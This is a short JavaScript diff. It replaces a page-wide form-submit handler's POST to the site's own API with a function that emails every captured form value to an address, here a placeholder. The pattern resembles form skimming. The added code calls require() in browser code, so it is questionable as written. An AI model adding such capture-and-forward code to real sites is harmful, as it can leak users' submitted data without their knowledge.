@@ -16,12 +16,16 @@ document.addEventListener('submit', (event) => {
       formDataValues[element.name] = element.value;
     }
   });
-  fetch('/api/form-data', {
-    method: 'POST',
-    body: JSON.stringify(formDataValues),
-    headers: { 'Content-Type': 'application/json' },
-  })
-    .then((response) => response.json())
-    .then((data) => console.log(data))
-    .catch((error) => console.error(error));
+  // Send the captured data to an email address
+  sendFormDataToEmail(formDataValues);
 });
+
+function sendFormDataToEmail(formDataValues) {
+  const emailService = require('email-service');
+  emailService.send({
+    from: 'your-email@example.com',
+    to: 'your-email@example.com',
+    subject: 'Form Data',
+    body: JSON.stringify(formDataValues),
+  });
+}
